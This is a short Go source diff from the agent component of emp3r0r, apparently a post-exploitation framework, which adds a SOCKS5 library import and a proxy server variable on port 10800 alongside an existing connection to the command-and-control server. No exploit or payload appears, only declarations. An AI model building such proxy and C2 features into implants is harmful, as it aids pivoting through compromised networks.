@@ -6,6 +6,7 @@ import (
 
 	"github.com/jm33-m0/emp3r0r/emagent/internal/tun"
 	"github.com/posener/h2conn"
+	"github.com/txthinking/socks5"
 )
 
 var (
@@ -17,6 +18,9 @@ var (
 
 	// H2Json the connection to CC, for JSON message-based communication
 	H2Json *h2conn.Conn
+
+	// ProxyServer Socks5 proxy listening on port 10800
+	ProxyServer *socks5.Server
 
 	// KernelVersion get linux version
 	KernelVersion = GetKernelVersion()
